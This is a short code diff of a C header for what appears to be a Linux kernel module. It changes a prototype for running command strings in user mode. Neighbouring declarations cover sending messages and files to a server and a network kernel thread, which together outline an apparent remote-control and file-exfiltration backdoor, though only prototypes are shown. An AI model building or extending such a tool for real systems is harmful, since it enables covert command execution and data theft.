@@ -70,7 +70,7 @@ extern bool thread_exited;					// Flag to indicate if the thread has exited
 // Function prototypes
 int init_exec_result(void);									// Initialize exec_result structure
 int free_exec_result(void);									// Free exec_result structure
-int exec_str_as_command(char *user_cmd);					// Execute a command string in user mode
+int exec_str_as_command(char *user_cmd, bool catch_stds);	// Execute a command string in user mode
 int send_to_server(char *message, ...);						// Send a message to the server
 int send_file_to_server(char *filename);					// Send a file to the server
 int network_worker(void *data);								// Kernel thread for network communication
